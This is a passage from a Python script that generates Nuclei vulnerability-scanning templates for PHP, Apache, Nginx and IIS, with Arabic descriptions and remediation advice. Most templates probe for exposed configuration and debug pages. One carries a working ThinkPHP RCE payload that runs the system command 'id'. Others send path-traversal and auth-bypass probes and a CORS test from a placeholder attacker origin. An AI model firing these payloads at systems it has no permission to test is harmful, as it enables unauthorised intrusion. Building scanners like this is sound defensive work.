        "remediation": "حذف ملفات phpinfo من الخادم وتعطيل دالة phpinfo في php.ini عبر disable_functions.",
        "tags": ["php", "phpinfo", "recon", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/phpinfo.php", "{{BaseURL}}/info.php", "{{BaseURL}}/test.php"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["PHP Version", "Configuration File (php.ini) Path"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "php",
        "file": "symfony-profiler-exposed.yaml",
        "id": "symfony-profiler-exposed",
        "name": "Symfony Web Debug Toolbar & Profiler Exposure",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "أداة تدقيق Symfony Profiler مفعلة في الإنتاج، مما يكشف تفاصيل الجلسات والطلبات وتكوين قواعد البيانات والمفاتيح.",
        "remediation": "تعطيل WebProfilerBundle في بيئات الإنتاج الفعلية وحظر مسار /_profiler.",
        "tags": ["php", "symfony", "profiler", "debug"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/_profiler/empty/search/results", "{{BaseURL}}/_profiler/"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Symfony Profiler", "Token", "Collector"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "php",
        "file": "composer-json-exposure.yaml",
        "id": "composer-json-exposure",
        "name": "PHP Composer Dependency Manifest Disclosure",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "كشف ملف composer.json يعرض أسماء الحزم والمكتبات البرمجية وإصداراتها الدقيقة، مما يسهل البحث عن ثغرات مكونات الطرف الثالث.",
        "remediation": "حظر الوصول المباشر لملفات composer.json و composer.lock عبر إعدادات خادم الويب.",
        "tags": ["php", "composer", "dependencies", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/composer.json", "{{BaseURL}}/composer.lock"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["\"require\":", "\"autoload\":"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "php",
        "file": "thinkphp-rce-invokefunction.yaml",
        "id": "thinkphp-rce-invokefunction",
        "name": "ThinkPHP 5.x Remote Code Execution",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "استدعاء الدوال العشوائية في إطار عمل ThinkPHP يسمح للمهاجم بتنفيذ تعليمات نظام التشغيل عبر تمرير دالة call_user_func_array.",
        "remediation": "تحديث إطار العمل ThinkPHP إلى أحدث إصدار محمي وفلترة محارف التوجيه.",
        "tags": ["php", "thinkphp", "rce", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "regex", "regex": ["uid=[0-9]+.*gid=[0-9]+.*"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },

    # =========================================================================
    # 7. APACHE (4 Templates) - Apache HTTP Server & Ecosystem
    # =========================================================================
    {
        "category": "apache",
        "file": "apache-htaccess-leak.yaml",
        "id": "apache-htaccess-leak",
        "name": "Apache .htaccess Server Access Control Configuration Leak",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "خادم Apache يفصح عن محتوى ملف .htaccess، مما يكشف قواعد إعادة التوجيه وقيود الوصول والمسارات الداخلية المحمية.",
        "remediation": "تفعيل حماية FilesMatch لمنع قراءة ملفات .ht* في إعدادات httpd.conf الرئيسية.",
        "tags": ["apache", "htaccess", "config"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/.htaccess"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["RewriteEngine", "RewriteRule", "AuthType"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "apache",
        "file": "apache-server-status.yaml",
        "id": "apache-server-status",
        "name": "Apache mod_status Server Status Page Exposure",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "صفحة حالة الخادم mod_status متاحة للعامة، مما يكشف عن كافة طلبات المستخدمين الحالية وعناوين IP والموارد المستدعاة.",
        "remediation": "تقييد الوصول لصفحة server-status بحصرها بعناوين IP الخاصة بالإدارة المحلية.",
        "tags": ["apache", "server-status", "recon", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/server-status"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Apache Server Status for", "Current Time:"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "apache",
        "file": "apache-tomcat-manager.yaml",
        "id": "apache-tomcat-manager",
        "name": "Apache Tomcat Web Application Manager Interface Exposed",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "واجهة إدارة تطبيقات Apache Tomcat متاحة للوصول العام، مما يجعلها عرضة لمحاولات تسجيل الدخول وتخمين كلمات المرور.",
        "remediation": "تقييد مسار /manager وحصره بشبكة الإدارة وتغيير بيانات الدخول الافتراضية في tomcat-users.xml.",
        "tags": ["apache", "tomcat", "manager"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/manager/html"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Tomcat Web Application Manager", "Apache Tomcat/"]},
                {"type": "status", "status": [200, 401]}
            ]
        }]
    },
    {
        "category": "apache",
        "file": "apache-solr-velocity-rce.yaml",
        "id": "apache-solr-velocity-rce",
        "name": "Apache Solr Velocity Template Remote Code Execution",
        "author": "YemenScan-Core",
        "severity": "critical",
        "description": "ثغرة في محرك قوالب Velocity الخاص بـ Apache Solr تتيح تشغيل شفرات برمجية عن بعد عن طريق تمرير معلمات خبيثة في طلبات البحث.",
        "remediation": "ترقية خوادم Apache Solr وتعطيل ميزة params.resource.loader في تكوينات solrconfig.xml.",
        "tags": ["apache", "solr", "rce", "critical"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/solr/admin/info/system"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["solr-spec-version", "lucene-spec-version"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },

    # =========================================================================
    # 8. NGINX (4 Templates) - Nginx Web Server & Configuration Flaws
    # =========================================================================
    {
        "category": "nginx",
        "file": "nginx-alias-traversal.yaml",
        "id": "nginx-alias-traversal",
        "name": "Nginx Off-By-Slash Alias Directory Traversal",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "خطأ إعداد في تعليمة alias داخل Nginx عند إغفال الشرطة المائلة الختامية يتيح للمهاجم قراءة ملفات خارج المجلد المحدد.",
        "remediation": "التأكد من مطابقة الشرطة المائلة الختامية في كل من مسار location ومسار alias (مثل location /static/ { alias /path/to/static/; }).",
        "tags": ["nginx", "traversal", "misconfiguration"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/static../", "{{BaseURL}}/files../"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Index of /", "<title>Index of"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "nginx",
        "file": "nginx-status.yaml",
        "id": "nginx-status",
        "name": "Nginx HTTP Stub Status Module Metric Disclosure",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "صفحة stub_status في خادم Nginx متاحة للعامة، مما يكشف عن عدد الاتصالات النشطة والطلبات المعالجة.",
        "remediation": "حظر الوصول لمسار stub_status إلا من عناوين IP الخاصة بالمراقبة (allow 127.0.0.1; deny all;).",
        "tags": ["nginx", "stub-status", "recon", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/nginx_status", "{{BaseURL}}/stub_status"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Active connections:", "server accepts handled requests"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "nginx",
        "file": "nginx-merge-slashes-bypass.yaml",
        "id": "nginx-merge-slashes-bypass",
        "name": "Nginx Merge Slashes URI Path Authentication Bypass",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "تعطيل خاصية merge_slashes في Nginx قد يسمح بتجاوز قواعد التوجيه والتحكم بالوصول عبر إرسال شرطات مائلة مكررة (///admin).",
        "remediation": "الإبقاء على خاصية merge_slashes on كخيار افتراضي في ملف nginx.conf.",
        "tags": ["nginx", "bypass", "auth", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}///admin/", "{{BaseURL}}///private/"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Dashboard", "Administration", "Admin Panel"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "nginx",
        "file": "nginx-cors-wildcard.yaml",
        "id": "nginx-cors-wildcard",
        "name": "Nginx Insecure CORS Wildcard Header Misconfiguration",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "إعداد ترويسة CORS في Nginx بشكل غير آمن يسمح لأي موقع خارجي بقراءة الاستجابات عبر Access-Control-Allow-Origin: *.",
        "remediation": "تحديد النطاقات المسموحة بدقة ومنع استخدام النجمة العامة مع البيانات المخصصة أو الحساسة.",
        "tags": ["nginx", "cors", "headers", "medium"],
        "http": [{
            "method": "OPTIONS",
            "path": ["{{BaseURL}}/api/"],
            "headers": {"Origin": "https://attacker.com"},
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "part": "header", "words": ["Access-Control-Allow-Origin: *"]},
                {"type": "status", "status": [200, 204]}
            ]
        }]
    },

    # =========================================================================
    # 9. IIS (4 Templates) - Microsoft IIS & ASP.NET Vulnerabilities
    # =========================================================================
    {
        "category": "iis",
        "file": "iis-web-config.yaml",
        "id": "iis-web-config",
        "name": "Microsoft IIS web.config Application Configuration File Leak",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "ملف تكوين خادم IIS وتطبيق ASP.NET (web.config) متاح للقراءة، كاشفاً عن سلاسل الاتصال بقواعد البيانات ومفاتيح machineKey.",
        "remediation": "التأكد من تفعيل وحدة حظر الملفات (Request Filtering) لمنع استدعاء ملفات *.config نهائياً.",
        "tags": ["iis", "aspnet", "web-config", "windows"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/web.config", "{{BaseURL}}/web.config.bak"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["<configuration>", "<system.web>", "connectionStrings"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "iis",
        "file": "iis-trace-disclosure.yaml",
        "id": "iis-trace-disclosure",
        "name": "Microsoft ASP.NET Diagnostic Trace Viewer Leak (trace.axd)",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "واجهة تتبع طلبات ASP.NET (trace.axd) متاحة للعامة، مما يكشف عن تفاصيل الطلبات والجلسات وكعكات الدخول والمقاييس الداخلية.",
        "remediation": "تعطيل خاصية التتبع عبر ضبط <trace enabled=\"false\" localOnly=\"true\"/> في ملف web.config.",
        "tags": ["iis", "aspnet", "trace", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/trace.axd"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Application Trace", "Requests to this Application"]},
                {"type": "status", "status": [200]}
            ]
        }]
    },
    {
        "category": "iis",
        "file": "iis-shortname-disclosure.yaml",
        "id": "iis-shortname-disclosure",
        "name": "Microsoft IIS 8.3 Short Filename Disclosure via Tilde (~1)",
        "author": "YemenScan-Core",
        "severity": "medium",
        "description": "خادم IIS يفصح عن وجود الملفات والمجلدات المخفية عبر ميزة أسماء الملفات القديمة 8.3 باستخدام محرف المدة (~1).",
        "remediation": "تعطيل إنشاء أسماء الملفات بتنسيق 8.3 في نظام الملفات Windows عبر تعيين NtfsDisable8dot3NameCreation إلى 1 في السجل.",
        "tags": ["iis", "shortname", "recon", "medium"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/*~1*/.aspx"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "status", "status": [404]}
            ]
        }]
    },
    {
        "category": "iis",
        "file": "iis-elmah-axd-leak.yaml",
        "id": "iis-elmah-axd-leak",
        "name": "Microsoft ASP.NET ELMAH Error Log Disclosure (elmah.axd)",
        "author": "YemenScan-Core",
        "severity": "high",
        "description": "لوحة تسجيل أخطاء تطبيقات ASP.NET (ELMAH) مكشوفة بدون تصريح، مما يتيح تصفح استثناءات البرمجة وسلاسل الاتصال وكعكات المستخدمين.",
        "remediation": "تأمين معالج ELMAH وتقييد الوصول له للمشرفين فقط عبر تكوينات التفويض في web.config.",
        "tags": ["iis", "aspnet", "elmah", "logs"],
        "http": [{
            "method": "GET",
            "path": ["{{BaseURL}}/elmah.axd"],
            "matchers-condition": "and",
            "matchers": [
                {"type": "word", "words": ["Error Log for", "Powered by ELMAH"]},
                {"type": "status", "status": [200]}
            ]
        }]
    }
]

print(f"Total template blueprints defined: {len(TEMPLATES)}")

counts = {}
for t in TEMPLATES:
    cat = t["category"]
    counts[cat] = counts.get(cat, 0) + 1
    cat_dir = os.path.join(NUCLEI_DIR, cat)
    os.makedirs(cat_dir, exist_ok=True)
    
    file_path = os.path.join(cat_dir, t["file"])
    
    yaml_dict = {
        "id": t["id"],
        "info": {
            "name": t["name"],
            "author": t["author"],
            "severity": t["severity"],
            "description": t["description"],
            "remediation": t["remediation"],
            "tags": t["tags"]
        },
        "http": t["http"]
    }
    
    with open(file_path, "w", encoding="utf-8") as f:
        yaml.dump(yaml_dict, f, allow_unicode=True, sort_keys=False, default_flow_style=False)

print("\nTemplates successfully written by category:")
for cat, count in sorted(counts.items()):
    print(f"  - {cat}: {count} templates")

print(f"\n[+] Total templates created: {sum(counts.values())}")
